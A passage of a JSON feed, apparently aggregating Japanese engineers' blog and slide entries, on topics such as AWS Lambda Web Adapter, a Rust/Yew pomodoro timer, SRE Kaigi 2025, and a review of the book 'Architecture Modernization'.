初めての海外カンファレンス","link":"https://speakerdeck.com/masasuzu/2025-01-31-ji-xiang-si-dot-pm-37-chu-metenohai-wai-kanhuarensu","contentSnippet":"KubeCon NA 2024に行ってきたのでその経験を話します。\\r\\r吉祥寺.pm 37で話しました。\\rhttps://kichijojipm.connpass.com/event/339040/","isoDate":"2025-01-31T05:00:00.000Z","dateMiliSeconds":1738299600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AWS Lambda Web Adapter の Function URL を Cloudfront で公開する","link":"https://blog.1q77.com/2025/01/aws-lambda-web-adapter-with-cloudfront/","contentSnippet":"これまでのおさらい前回、AWS Web Adapter を用いた AWS Lambda に Function URL を使って公開することはできた。今回はこれをカスタムドメインで公開するべく CloudFront と連携させます。OAC (Origin Access Control)2024年4月に CloudFront と Function URL の間を OAC (Origin Access Control) を使って Function URL への直アクセスを防ぐことができるようになっていたのでこれも試します。Amazon CloudFront が Lambda 関数 URL オリジンのオリジンアクセスコントロール (OAC) を新たにサポート","isoDate":"2025-01-30T15:01:24.000Z","dateMiliSeconds":1738249284000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AWS Lambda Web Adapter でお手軽 Web Service 公開","link":"https://blog.1q77.com/2025/01/aws-lambda-web-adapter/","contentSnippet":"ずっと AWS にも Cloud Run が欲しいなあと思っていました。AppRunner はコレじゃない…そんなある日、あれ？ AWS Lambda でいけんじゃね？と思い検索すると","isoDate":"2025-01-29T15:40:00.000Z","dateMiliSeconds":1738165200000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"RustとYewでポモドーロタイマーを作ってみた","link":"https://syu-m-5151.hatenablog.com/entry/2025/01/29/120446","contentSnippet":"はじめにイベントで定期的に登壇をしていて休日出勤したのに消化しきれなかった代休が余っていたので、3連休爆誕させて以前から興味のあったWebAssemblyの学習に時間を使ってみることにしました(いくつか本も読んだのでいつか紹介します。)。「とりあえず何か作ってみる」のが一番の近道だと考え、日々の私生活でも使えそうなポモドーロタイマーを実装することにしました。WebAssemblyのエコシステムを調べていく中で、RustのYewというフレームワークが目に留まりました。ReactライクなAPIでWebAssemblyアプリケーションが作れるとのことで、ちょっと開発することにしました。github.com使用技術の選定理由Rust：WebAssemblyのための優れたツールチェーンを持っており、学習コストは高めですが、型安全性と高いパフォーマンスが魅力でしたYew：ReactライクなAPIで、コンポーネントベースの開発が可能。フロントエンド開発者にとって親しみやすい設計になっていますTrunk：ビルドツールとして採用。trunk serveだけで開発サーバーが立ち上がる手軽さが気に入りました技術スタックRust (v1.75.0)Yew (v0.21)WebAssemblyTrunk (Bundler)プロジェクトの概要ポモドーロテクニックは25分の作業時間と5分の休憩を交互に行う時間管理手法です。今回実装したアプリケーションでは、以下の機能を提供します：基本的なタイマー機能25分のカウントダウン開始/停止/リセット制御視覚的なフィードバックタスク管理機能タスクの記録実際の作業時間の追跡完了したタスクの履歴管理データエクスポート機能マークダウン形式での出力クリップボードへのコピー機能実装の詳細プロジェクトのセットアップまず、必要なツールとターゲットをインストールします：rustup target add wasm32-unknown-unknowncargo install trunk主要なデータ構造タスクとタイマーの状態管理のための構造体：#[derive(Clone, Debug)]struct Task {    description: String,    completed_at: DateTime<Local>,    duration: i32,}pub struct PomodoroTimer {    time: i32,    running: bool,    interval: Option<Interval>,    current_task: String,    completed_tasks: Vec<Task>,    initial_time: i32,    markdown_visible: bool,    markdown_content: String,}タイマー機能の実装Yewのコンポーネントシステムを利用して、タイマーの制御を実装しました：fn update(&mut self, ctx: &Context<Self>, msg: Self::Message) -> bool {    match msg {        Msg::Start => {            if !self.running {                let link = ctx.link().clone();                self.interval = Some(Interval::new(1000, move || {                    link.send_message(Msg::Tick);                }));                self.running = true;            }            true        }        // 他のメッセージハンドラ...    }}クリップボード機能の実装WebAssemblyからブラウザのクリップボードAPIを利用する実装：Msg::CopyToClipboard => {    if let Some(window) = window() {        let navigator = window.navigator();        let clipboard = navigator.clipboard();        let _ = clipboard.write_text(&self.markdown_content);    }    true}開発で直面した課題と解決策WebAssemblyとブラウザAPIの連携課題：クリップボード機能の実装で型の不一致が発生解決：web-sysクレートの適切な機能を有効化し、型の変換を正しく処理状態管理とライフタイム課題：コンポーネントの状態管理でライフタイムエラーが発生解決：use_stateとuse_mut_refを適切に使い分けて実装セットアップと実行方法プロジェクトの作成：cargo new --lib yew-pomodorocd yew-pomodoro依存関係の追加（Cargo.toml）：[dependencies]yew = { version = \\"0.21\\", features = [\\"csr\\"] }gloo-timers = \\"0.3\\"web-sys = { version = \\"0.3.64\\", features = [\\"console\\", \\"HtmlInputElement\\", \\"Window\\", \\"Navigator\\", \\"Clipboard\\"] }wasm-bindgen = \\"0.2\\"chrono = \\"0.4\\"アプリケーションの実行：trunk serve開発を通じて学んだことWebAssemblyの基本概念JavaScriptとの連携方法パフォーマンスの最適化ポイントRustの特徴的な機能所有権システム型安全性の恩恵コンパイル時のエラーチェックの強力さフロントエンド開発での新しい視点パフォーマンスを意識したコンポーネント設計WebAssemblyならではの制約と利点所感代休を使って新しい技術に触れる時間が作れたのは、とても良い経験になりました。特に、JavaScriptで書いているような処理をRustで書き直してみることで、言語の特性や設計の違いについて深く考える機会になりました。WebAssemblyは確かにまだエコシステムが発展途上ですが、Yewのような成熟したフレームワークを使えば、実用的なアプリケーションを比較的スムーズに開発できることが分かりました。ソースコードプロジェクトのソースコードはGitHubで公開しています。コメントや改善案があれば、お気軽にIssueやPull Requestを送ってください。次のステップ今回の学習を通じて、WebAssemblyの可能性を実感できました。次は以下のような発展的な内容に挑戦してみたいと考えています：Rustの非同期処理を活用した機能拡張WebAssemblyのパフォーマンス測定と最適化より大規模なアプリケーションでの実践参考リンクRust公式ドキュメントYewドキュメントRustで始めるWebAssemblyMDN WebAssemblyガイド休暇を使って新しい技術に触れることで、普段の業務にも新しい視点を持ち込めそうです。皆さんも、空き時間を見つけて興味のある技術に触れてみてはいかがでしょうか。読んだ書籍Rustで学ぶWebAssembly――入門からコンポーネントモデルによる開発まで エンジニア選書作者:清水 智公技術評論社AmazonProgramming WebAssembly with Rust: Unified Development for Web, Mobile, and Embedded Applications (English Edition)作者:Hoffman, KevinPragmatic BookshelfAmazon","isoDate":"2025-01-29T03:04:46.000Z","dateMiliSeconds":1738119886000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Renovate を手元の repository に対して debug 実行する","link":"https://blog.1q77.com/2025/01/renovate-local-debug/","contentSnippet":"renovate の設定を手元で試行錯誤したい時のメモです。Local Platform--platform=local を指定して実行すると local filesystem を対象として renovate を実行することができます。https://docs.renovatebot.com/modules/platform/local/手元の working copy の root directory で実行します。(npx は使わなくても良いが install からやってくれるので)","isoDate":"2025-01-28T10:45:08.000Z","dateMiliSeconds":1738061108000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"論文紹介 ”Long-Context LLMs Meet RAG: Overcoming Challenges for Long Inputs in RAG” @GDG Tokyo","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-long-context-llms-meet-rag-overcoming-challenges-for-long-inputs-in-rag-at-gdg-tokyo","contentSnippet":"https://gdg-tokyo.connpass.com/event/340671/\\r\\r大規模言語モデル（LLM）は、外部の知識源を利用することで、より強力な応答を生成できるようになります（これをRetrieval-Augmented Generation: RAGと呼びます）。LLMが処理できる入力テキストの長さが長くなるにつれて、より多くの関連情報をRAGで与えられるようになり、生成される回答の質が向上することが期待されます。一般的には、取得する情報が多いほど関連情報（高い再現率）も増え、結果として性能が向上すると考えられます。\\r\\rしかし、長文処理LLMにおけるRAGの性能が、取得する情報が増えすぎると逆に低下する現象を明らかにし、その原因が「ハードネガティブ」な情報にあることを示しました。そして、その問題を解決するために、効果的な学習不要および学習を伴うアプローチを提案しています。","isoDate":"2025-01-28T05:00:00.000Z","dateMiliSeconds":1738040400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"vim-jpラジオ#27・#28聞いた - 実はEmacs30年選手！t-wadaさん登場！","link":"https://blog.atusy.net/2025/01/28/vim-jp-radio-27/","contentSnippet":"分かるところからやってけ","isoDate":"2025-01-28T00:00:00.000Z","dateMiliSeconds":1738022400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Rのloggerパッケージで構造化ログを出力する時にメタフィールドの名前を変更する","link":"https://blog.atusy.net/2025/01/27/r-logger-rename-metafield/","contentSnippet":"loggerパッケージはRのログ出力に使います。ログはプログラムの進捗確認や、問題発生時のデバグなどに便利なので、ぜひ活用したいところですね。","isoDate":"2025-01-27T00:00:00.000Z","dateMiliSeconds":1737936000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Site Reliability Engineering on Kubernetes","link":"https://speakerdeck.com/nwiizo/site-reliability-engineering-on-kubernetes","contentSnippet":"2025年01月26日 10:35-11:05（ルーム A）にて「Site Reliability Engineering on Kubernetes」というタイトルで登壇します。\\r\\rイベント名: SRE Kaigi 2025\\r\\r公式URL: https://2025.srekaigi.net/\\r\\rセッションURL: https://fortee.jp/sre-kaigi-2025/proposal/a75769d1-7835-4762-a1f6-508e714c8c8e\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/01/26/005033","isoDate":"2025-01-26T05:00:00.000Z","dateMiliSeconds":1737867600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Fishシェルでターミナルのタイトルをプロジェクトルートからの相対パスっぽくする","link":"https://blog.atusy.net/2025/01/26/fish-title-relative-to-projroot/","contentSnippet":"たとえば、git管理しているプロジェクトとかで、foo/appとかにするイメージ","isoDate":"2025-01-26T00:00:00.000Z","dateMiliSeconds":1737849600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"SRE Kaigi 2025 で登壇してきます。 #srekaigi","link":"https://syu-m-5151.hatenablog.com/entry/2025/01/26/005033","contentSnippet":"はじめにnwiizoです。2025年1月26日のSRE Kaigi 2025にて「Site Reliability Engineering on Kubernetes」というタイトルで登壇させていただきます。本イベントは「More SRE !」をテーマに、SREの知見共有と技術者の交流を目的とした技術カンファレンスです。2025.srekaigi.netこの発表資料を作成するきっかけとなったのは、私が翻訳に関わった「Kubernetesで実践する Platform Engineering」（2025年2月19日出版予定）の仕事でした。本書の翻訳作業を通じて、SREとPlatform Engineeringの密接な関係性、そしてKubernetesがこれらを実現する優れた基盤となることを改めて実感しました。Kubernetesで実践する Platform Engineering作者:Mauricio Salatino翔泳社Amazon発表資料 speakerdeck.com発表資料はSpeaker Deckで公開しています。イベントのテーマである「さらにSREを広めよう」に沿って、SREやKubernetesの未経験者でも理解しやすい実装例やアーキテクチャパターン、参考資料を用意しました。紹介したものは一例であり、これだけが唯一の正解ではありません。また、イベントにおける最初の発表なのでSREについての部分も多めに説明しています。こちら、Xでのポストなのでリポストなどしてもらえれば幸いです。\uD83D\uDC7BSRE Kaigi 2025 にて「Site Reliability Engineering on\xa0Kubernetes」というタイトルで登壇します。こちら、資料になります。https://t.co/SLoohm83jy#srekaigi #srekaigi_a— nwiizo (@nwiizo) 2025年1月26日   今回の発表内容は、以下のような幅広いトピックをカバーしています：基本的な概念と実装SREの本質：システムの信頼性を制御する技術としてのSREKubernetesにおけるSRE原則の実践方法Cloud Nativeアプローチによる実装戦略具体的な実装手法包括的な可観測性の実現GitOpsを活用した変更管理の自動化と標準化Progressive Deliveryの実装と運用ノウハウインシデント対応と自動復旧の仕組み化最新ツールの活用事例CloudEventsによるイベント基盤の構築Keptn Lifecycle Toolkitを用いた品質管理Argo Rolloutsによるデプロイメント制御Crossplaneを活用したリソース管理の自動化プラットフォームの発展成熟度モデルに基づく段階的な改善開発者の認知負荷軽減に向けた取り組みデータドリブンな運用改善の実現方法手を動かすオススメハンズオン発表内容をより深く理解し、実践的なスキルを身につけるために、以下のハンズオンをお勧めします：github.comCloud Native Days主催のハンズオン教材です。KubernetesやCloud Nativeツールの基本的な使い方から応用まで、段階的に学べます。実際の運用シナリオに基づいた実践的な内容となっていますgithub.comPlatform Engineering on Kubernetesの実践的なガイドです。本書の著者が作成した、実装例とベストプラクティスを含むリポジトリです。一つ一つのコンポーネントを実際に動かしながら、プラットフォームの構築方法を学べます。これらのハンズオンを通じて、セッションで紹介する概念や技術を実際に試してみることをお勧めします。理論と実践を組み合わせることで、より深い理解と実装スキルを得ることができます。また、これらの教材は常にアップデートされているため、最新のベストプラクティスも学ぶことができます。おわりに本セッションは、かなり雑多な内容を30分に詰め込んだ欲張りな構成となっています。これは、現場によって異なるSREの課題や取り組みを幅広く共有したいという思いを反映したものです。特に強調したい点は以下の3つです：SREは単なるツールの導入ではなく、組織が信頼性を制御するための包括的な取り組みであることKubernetesは優れた基盤を提供するが、適切な設計と運用が必要不可欠であること適切なオープンソースツールを組み合わせることで、本格的なSRE実装が可能になることこのセッションが「さらにSREに関わる技術者の活躍の場を増やす」「さらにSREを理解し、興味を持っていただける技術者を増やす」という本イベントの目標に貢献できれば幸いです。セッションは2025年1月26日 10:35-11:05、ルームAで行われます。SREに関わる技術者の方々はもちろん、SREに興味を持ち始めた方々のご参加もお待ちしています。詳細は公式サイトでご確認いただけます。イベントに関する最新情報は、X（旧Twitter）の @srekaigi で発信されていますので、ぜひフォローしてください。多くの方々とSREについての知見を共有できることを楽しみにしています。","isoDate":"2025-01-25T15:50:33.000Z","dateMiliSeconds":1737820233000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイクにおけるOSSの取り組み","link":"https://speakerdeck.com/bells17/surisieikuniokeruossnoqu-rizu-mi","contentSnippet":"3-shake SRE Tech Talk #11 オンサイトの登壇資料です。\\r\\rhttps://3-shake.connpass.com/event/339212/","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"bells17","authorId":"bells17"},{"title":"OpenClarityを覗いてみる","link":"https://speakerdeck.com/kojake_300/openclaritywosi-itemiru","contentSnippet":"","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"2025-01-24-SRETT11-OpenTofuについてそろそろ調べてみるか","link":"https://speakerdeck.com/masasuzu/2025-01-24-srett11-opentofunituitesorosorodiao-betemiruka","contentSnippet":"OpenTofuについて調べてみた内容\\r\\rSRETT #11 https://3-shake.connpass.com/event/339212/","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"論文紹介 ”Long-Context LLMs Meet RAG: Overcoming Challenges for Long Inputs in RAG”","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-long-context-llms-meet-rag-overcoming-challenges-for-long-inputs-in-rag","contentSnippet":"https://genai-users.connpass.com/event/341391/\\r\\r大規模言語モデル（LLM）は、外部の知識源を利用することで、より強力な応答を生成できるようになります（これをRetrieval-Augmented Generation: RAGと呼びます）。LLMが処理できる入力テキストの長さが長くなるにつれて、より多くの関連情報をRAGで与えられるようになり、生成される回答の質が向上することが期待されます。一般的には、取得する情報が多いほど関連情報（高い再現率）も増え、結果として性能が向上すると考えられます。\\r\\rしかし、長文処理LLMにおけるRAGの性能が、取得する情報が増えすぎると逆に低下する現象を明らかにし、その原因が「ハードネガティブ」な情報にあることを示しました。そして、その問題を解決するために、効果的な学習不要および学習を伴うアプローチを提案しています。","isoDate":"2025-01-21T05:00:00.000Z","dateMiliSeconds":1737435600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"現代システムの三体問題「技術」「組織」「戦略」を巡る戦い - Architecture Modernization の読書感想文","link":"https://syu-m-5151.hatenablog.com/entry/2025/01/21/124130","contentSnippet":"そう、どこなのか知ったら、世界が一枚の地図みたいに小さくなってしまう。どこなのか知らないほうが、世界を広く感じられる。(引用:三体 黒暗森林〈上〉P152)はじめに「Architecture Modernization」は、一見すると整然と並べられた章立てと体系的な解説を持つアーキテクチャ現代化のガイドブックのように見えます。しかし、その内実は現代のソフトウェア開発が抱える混沌とした課題に真正面から向き合い、そこから組織の持続的な競争力を構築するための、書籍です。本書は、アーキテクチャ現代化を単なる技術的な刷新を超えて、組織全体の変革を必要とする戦略的な取り組みとして位置付けています。それは時として、既存の組織構造や慣習との軋轢を生み出し、チームの価値観や働き方の根本的な見直しを迫ることにもなります。著者はそうした困難な課題に対して、EventStorming、Wardley Mapping、Team Topologiesといった手法を、その本質的な価値を深く理解した上で、実践的な知見と共に提示します。手法それぞれは、世の中で広く知られているものばかりですが、本書の真価は、これらの手法を組織の現代化という大きな文脈の中で有機的に結びつけ、包括的なアプローチを形作っている点にあります。どの章も一つの主題に対する深い考察と実践知に裏打ちされており、表面的な解説で済ませることはありません。それでいて、各章は独立した価値を持ちながら、全体として一つの強力な変革の方法論を形作っています。それは、著者がこの混沌とした現代のソフトウェア開発の課題に対して、明確な指針を示そうとする強い意志の表れでもあるのです。learning.oreilly.com現代化の重要性と課題私たちが直面するソフトウェア開発の課題は、年々複雑さを増しています。そしてシステムの複雑性は今後さらに加速度的に増大するでしょう。2024年に見られた生成AIの急速な進展は、技術革新がもたらす変化の速度と規模を如実に示しています。このような状況下で、レガシーシステムの制約は組織の存続を脅かすリスクとなり得ます。一方で、現代的なアーキテクチャは大きな競争優位性をもたらす可能性があります。新興企業の中には、最新のアーキテクチャを採用することで、わずか数ヶ月で大規模なプラットフォームを構築し、急成長を遂げた例も存在します。クラウドネイティブなアーキテクチャの採用により、市場投入までの時間を大幅に短縮し、迅速な価値提供を実現しているのです。しかし、技術革新それ自体が自動的に社会全体や組織の繁栄をもたらすわけではありません。過去1000年の歴史を振り返ると、技術革新の恩恵は往々にして一部の組織や個人に集中し、広く行き渡らないケースが多かったことがわかります。現代のソフトウェア開発においても、技術革新の成果をいかに組織全体で共有し、持続可能な価値創造につなげていくかという課題に向き合う必要があります。技術革新と不平等の1000年史　上作者:ダロン アセモグル,サイモン ジョンソン早川書房Amazon技術革新と不平等の1000年史　下作者:ダロン アセモグル,サイモン ジョンソン早川書房Amazon本書のアプローチ本書の独自性は、技術的な側面だけでなく、組織とビジネスの文脈でアーキテクチャを捉える包括的な視点にあります。特に重要なのは、Better Value Sooner Safer Happier (BVSSH)という概念を通じて、現代化がもたらす多面的な価値を評価するフレームワークを提供している点です。また、本書はDomain-Driven Design、Event Storming、Wardley Mappingなど、実践で検証された手法を効果的に組み合わせながら、組織の現代化を実現するための具体的なアプローチを提供します。特に注目すべきは、コラボレーティブな手法とチームの自律性を重視する現代的なアプローチが、今日のソフトウェア開発の最前線で求められる実践と整合している点です。読み進めていくと、一見すると「知っている」と思っていた概念や手法であっても、それらが体系的に整理され、より深い文脈の中で位置付けられていることに気づかされます。例えば、EventStormingやDDDといった手法については、多くの開発者が知っているものの、それらを組織の変革やビジネス価値の創出と結びつけて理解している人は少ないかもしれません。本書は、これらの「知っているつもりだった」内容に新しい光を当て、より実践的で戦略的な視点を提供してくれます。特筆すべきは、本書が扱う「技術」「組織」「戦略」の3つの柱のうち、「戦略」には技術戦略だけでなく、ビジネス戦略も深く含まれている点です。アーキテクチャの選択がビジネスモデルや市場での競争優位性にどのように影響するのか、という視点は、技術リーダーが経営層と建設的な対話を行う上で非常に有用です。また、本書の独自性は、技術的なベストプラクティスを単に羅列するのではなく、それらを他の文脈の中で捉え直している点にあります。読者は自身の経験を振り返りながら、「あのとき、こういう視点があれば...」という新しい発見を数多く経験することになるでしょう。以下、各章の分析を通じて、本書が提供する実践的な知見と、その現場での適用方法について詳しく見ていきましょう。Architecture Modernization: Socio-technical alignment of software, strategy, and structure (English Edition)作者:Tune, Nick,Perrin, Jean-GeorgesManningAmazon1 What is architecture modernization?第1章「What is architecture modernization?」は アーキテクチャ現代化の本質的な価値とその戦略的重要性を包括的に論じています。この章を通じて著者は アーキテクチャ現代化が単なる技術刷新ではなく ビジネスの競争優位性を確立するための戦略的な活動であることを具体的な事例とともに示しています。特に現代化への投資を躊躇することで発生する負のスパイラルと その打開策としての進化的アプローチの重要性は 実務者として強く共感できる内容です。ソフトウェアファースト第２版　あらゆるビジネスを一変させる最強戦略作者:及川 卓也日経BPAmazonアーキテクチャ現代化の必要性とリスクアーキテクチャ現代化の重要性は、ある大手航空会社の事例によって象徴的に示されています。2022年に発生した数十年前のスケジューリングシステムの障害は、1万4千便以上のフライトのキャンセルを引き起こし、ブランドに甚大なダメージを与えました。このような重大なインシデントは、時代遅れのレガシーアーキテクチャがビジネスリスクであり、競争上の不利益をもたらすことを如実に示しています。ソフトウェアアーキテクチャの基礎 ―エンジニアリングに基づく体系的アプローチ作者:Mark Richards,Neal FordオライリージャパンAmazon一方で、英国のある自動車販売スタートアップは、サーバーレスなどの現代的なアーキテクチャを採用することで、わずか90日でオンライン中古車販売プラットフォームを構築し、英国で最速のユニコーン企業となりました。この成功は、レガシーの制約がない状態で最新のテクノロジーを活用できることの価値を示しています。両社の対比は、現代的なアーキテクチャがもたらす競争優位性を鮮明に示しています。Figure 1.1 The negative cycle of declining architecture health より引用Figure 1.1は アーキテクチャ現代化への投資を先送りすることで発生する負のスパイラルを示しています。システムの健全性が低下し 現代化のコストが増大することで さらに経営層の投資判断が躊躇われるという悪循環です。この問題の深刻さは Adam TornhillとMarkus Borgの研究「Code Red: The Business Impact of Code Quality」によって定量的に示されています。彼らの調査では システムの技術的負債により開発者の時間の最大42%が無駄になっていると指摘しています。arxiv.orgさらに IoTデバイスの急増に象徴されるように システムの複雑性は年々増大しており この問題は今後さらに深刻化すると予想されます。2019年に86億台だったIoTデバイスは 2030年には300億台近くまで増加すると予測されています。このような複雑性の増大は 古いアーキテクチャの欠点と現代的なアーキテクチャの利点をさらに顕著にすると考えられます。learning.oreilly.comアーキテクチャ現代化の本質と価値創造著者は アーキテクチャの現代化を 社会技術的なアプローチとして捉えることの重要性を強調しています。これは NetflixのCTOであったAdrian Cockroftの言葉に端的に表れています。「四半期ごとのリリースしかできない企業は 日次デプロイメントを実現している競合他社に大きく引き離される」という彼の警告は 現代化の遅れが存在的な脅威となりうることを示しています。Netflixは2009年に モノリシックなアーキテクチャから数百のクラウドベースのマイクロサービスへと移行し オンラインストリーミング市場での競争優位性を確立しました。この事例は 確立された企業であっても適切な現代化戦略によって イノベーションのスピードを加速できることを証明しています。Figure 1.3 Better Value Sooner Safer Happier. (Source: Smart et al., Sooner Safer Happier: Antipatterns and Patterns for Business Agility [Portland, OR: IT Revolution 2020]) より引用Figure 1.3で示されるBetter Value Sooner Safer Happier (BVSSH)モデルは アーキテクチャ現代化が組織にもたらす価値を多面的に表現しています。Betterは品質改善による効率化と手戻りの削減 Valueは収益改善や顧客維持率の向上などのビジネス成果 Soonerは学習と価値提供の迅速化 Saferはガバナンス リスク セキュリティ コンプライアンスの確保 Happierは従業員満足度の向上を表します。このモデルは ステークホルダーのニーズをバランスよく考慮し 現代化の効果を包括的に評価するフレームワークとして機能します。独立した価値ストリームの重要性アーキテクチャ現代化の核となる概念が 独立した価値ストリーム (IVS) です。Figure 1.5は IVSの4つの主要特性を示しています。ドメイン整合性は特定のビジネスサブドメインとの整合 成果志向はビジネス成果への貢献 チームの権限委譲はプロダクトと技術の意思決定の自律性 ソフトウェアの疎結合は独立した開発・デプロイの実現を意味します。これらの特性が重要である理由は BVSSHの実現に直結するためです。適切なドメイン境界の設定は ビジネスにおける結合度を低減し 関連する概念をグループ化します。これにより ソフトウェアとチーム間の依存関係が減少し チーム間の調整や待ち時間が最小化されます。結果として 新機能の開発がより迅速になります。成果志向のアプローチは より良い価値の創出につながります。著名なプロダクトマネジメントの専門家であるMarty Caganが指摘するように「エンジニアをコーディングだけに使っているなら その価値の半分しか活用できていない」のです。チームにチューニングされた要件を与えるのではなく 達成すべき成果を示し 解決策の発見を委ねることで エンジニアの創造的な才能を最大限に引き出すことができます。著者は IVSを実現するための重要な手法として EventStorming を提唱しています。Figure 1.7は ドメインエキスパート 開発者 プロダクトマネージャー UXスペシャリストなど多様な関係者が協力してドメイン境界を特定するプロセスを示しています。このコラボレーティブなアプローチは 従来の中央集権的なアーキテクチャ設計からの大きな転換を意味します。多様な参加者の知見を活用することで より質の高いドメイン境界の特定が可能になります。進化的なアプローチとポートフォリオ思考アーキテクチャ現代化は 数年にわたる長期的な取り組みですが 著者は ポートフォリオ駆動の進化的アプローチを提唱しています。これは 現代化を単なる古いシステムの書き換えとしてではなく UX 製品機能、ビジネスプロセス、ドメインモデルを根本的に見直す機会として捉える考え方です。Figure 1.10 Identifying the optimal modernization return on investment per subdomain with the Modernization Strategy Selector より引用Figure 1.10で示される現代化戦略セレクターは 各サブドメインに対する最適な現代化投資を特定し 優先順位付けを行うためのツールです。すべてのサブドメインで同じレベルの投資が必要なわけではなく むしろそれは最高価値の現代化機会の実現を遅らせる原因となります。このツールは 各領域の特性に応じて適切な戦略を選択することを可能にします。Figure 1.11 Architecture modernization is parallel streams of work (not phases) supported by continuous learning and upskilling. より引用著者は 現代化を【発見】【設計】【実装】の3つの並行ストリームとして捉えることを提案しています。Figure 1.11は これらのストリームが相互に影響を与えながら継続的に進化していく様子を示しています。この並行性こそが進化的アプローチを可能にする要因です。あるストリームでの発見が次の四半期の実装に影響を与え 実装での学びが次の設計に反映されるという具合です。特に 継続的な学習とスキル向上を現代化の基盤として位置付けている点は注目に値します。これは チームが新しい考え方や手法を習得し 実践する時間と機会を確保することの重要性を示しています。学習と実践の機会が不足すると 古い思考パターンのまま新しいアーキテクチャを設計してしまい その欠陥が引き継がれるリスクがあります。著者は この進化的なアプローチを支援するために Architecture Modernization Enabling Team (AMET) の設置を推奨しています。AMETは従来のアーキテクチャチームとは異なり 意思決定を行うのではなく 他のチームを支援し 現代化の持続的な改善を促進する役割を担います。これは 現代化のモメンタムを維持し 現代化終了後も持続可能な改善を実現するための重要な施策です。まとめ第1章は アーキテクチャ現代化を包括的な視点で捉え その本質と実践的なアプローチを示しています。とある組織の対比を通じて現代化の重要性を示し BVSSHモデルによって現代化の多面的な価値を明確化しています。IVSという概念を通じて現代化を実現するための具体的な方法論を提供し 進化的アプローチとポートフォリオ思考の重要性を強調することで 現代化を持続可能な取り組みとして位置付けています。本章は 現代のソフトウェア開発組織がアーキテクチャ現代化に取り組む際の 実践的かつ戦略的なガイドラインを提供していると評価できます。アーキテクチャ現代化が 技術的な刷新を超えて 組織の競争力を根本的に強化する戦略的な取り組みであることを 説得力をもって示している点は 特に印象的です。また コラボレーティブな手法とチームの自律性を重視する現代的なアプローチは 今日のソフトウェア開発の最前線で求められる実践と整合しています。2 Preparing for the journey第2章「Preparing for the journey」は アーキテクチャ現代化の旅を始める前に考慮すべき重要な準備と課題について包括的に論じています。著者は 組織の準備状況の評価から新しいアーキテクチャ思考の導入 そしてリーダーシップの重要性に至るまで 現代化への取り組みを成功に導くための具体的なガイダンスを提供しています。リーダーシップの準備著者は まず リーダーシップの準備状況 を評価することの重要性を強調しています。新機能の開発を一時的に減速させてまで現代化に投資する覚悟 レガシーシステムの複雑さと変更の困難さの理解 予期せぬ遅延やコスト増加への対応 資金調達モデルや優先順位付けプロセスの変更への準備など リーダーシップチームが直面する重要な課題を詳細に説明しています。特に重要なのは 学習と能力開発への投資です。著者は 現代化が一時的なワークショップやトレーニングコースではなく 継続的な財務的・時間的投資を必要とすることを強調しています。これは 必要なスキルを持つ人材を大量に雇用することでも解決できない問題です。新しい従業員は会社のドメイン システム 文化を学ぶ必要があり それには数ヶ月を要します。スタッフエンジニア　マネジメントを超えるリーダーシップ作者:Will Larson日経BPAmazon新しいアーキテクチャ思考の導入著者は コンウェイの法則 の重要性を強調しています。システムの設計は それを設計・構築する組織のコミュニケーション構造を反映するという原則です。Figure 2.1は 緩やかに結合されたドメイン境界が緩やかに結合されたソフトウェアアーキテクチャを可能にすることを示しています。これは チームが単一のビジネスサブドメインに整合した単一のコードベースで作業できることを意味します。Figure 2.1 Fast flow requires loosely coupled software architecture, which requires loosely coupled domains. より引用コラボレーティブなアーキテクチャ実践の採用も重要な課題です。著者は イベントストーミングなどの現代的な手法を早期に導入し その受け入れ状況を理解することを推奨しています。これらの手法は 伝統的なトップダウンのアプローチとは大きく異なり あらゆる分野の関係者が協力してドメイン境界を特定し 最適なソリューションを選択します。銀の弾丸及び金槌への警告著者は 「ボルトオン現代化」への警告を発しています。これは 根本的なアーキテクチャ上の課題に取り組まず システムの表面的な部分だけを変更するアプローチです。著者は政府サービスの構築での経験を引用し レガシーシステムやデータベースとの統合が残されたままでは 真の改善が実現できないことを示しています。情報を正しく選択するための認知バイアス事典作者:情報文化研究所フォレスト出版Amazon同様に 構造とプロセスの誤謬にも注意を促しています。組織構造の変更や新しいプロセスの採用だけでは 深い変化なしには大きな改善は望めません。チームワークの促進 製品決定の権限委譲 ビジネス・IT間の壁の解消 資金調達モデルの変更 技術品質への投資など 包括的な変更が必要です。ICEの事例から学ぶ成功要因著者は ICEの現代化事例を通じて 実践的な成功要因を示しています。ICEは ドメイン駆動設計とEventStormingを活用してドメインを理解し ストラングラーパターンを用いた段階的な移行を計画しました。その結果 データ取り込み処理時間の80%削減 新規サービスプロバイダーのオンボーディング時間の大幅短縮 マッチング生産性の5倍向上など 顕著な成果を達成しました。www.iceservices.com重要なのは この成功が技術的な側面だけでなく 社会的な側面への取り組みによって実現されたことです。チームの権限委譲 クロスファンクショナルな協力 製品中心の資金調達モデルへの移行など 組織的な変革が成功の鍵となりました。リーダーシップの多層的な展開最後に著者は あらゆるレベルでのリーダーシップの重要性を強調しています。ビジネス戦略の理解と貢献 現代化戦略の定義 アーキテクチャの設計と進化 組織構造の確立 ビジョンと進捗の伝達など 現代化のリーダーには多くの責任があります。これらの責任は単一のスーパーヒーローや小グループだけでは担えません。著者は Architecture Modernization Enabling Team (AMET) の設置を提案し リーダーシップの育成と支援の具体的な方法を示しています。AMETは 組織全体の現代化能力を高め 